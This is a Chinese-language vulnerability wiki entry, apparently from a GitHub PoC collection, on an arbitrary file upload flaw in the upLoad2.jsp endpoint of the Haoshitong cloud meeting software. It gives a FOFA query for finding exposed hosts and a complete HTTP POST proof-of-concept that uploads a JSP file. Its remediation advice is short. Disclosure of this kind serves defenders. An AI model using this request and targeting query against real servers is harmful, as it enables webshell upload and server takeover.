---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 好视通云会议 upLoad2.jsp 任意文件上传漏洞 

# 漏洞描述

好视通云会议upLoad2接口存在任意文件上传漏洞，攻击者可通过该漏洞上传任意文件到服务器上，包括木马后门文件，导致服务器权限被控制。

# 影响版本

好视通-云会议

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/loginCheck.do?accessType=isTrueCode" || app="好视通-云会议"

POC/EXP：

POST /fm/systemConfig/upLoad2.jsp HTTP/1.1
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs
Accept-Encoding: gzip

--1515df1sdfdsfddfs
Content-Disposition: form-data; name="file"; filename="cs.jsp"
Content-Type: application/octet-stream

<% out.print("test"); %>
--1515df1sdfdsfddfs--

![image-20241024151011617](./.resource/好视通云会议upLoad2.jsp任意文件上传漏洞/media/image-20241024151011617.png)


![image-20241024151027110](./.resource/好视通云会议upLoad2.jsp任意文件上传漏洞/media/image-20241024151027110.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限。

联系厂家及时打补丁。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
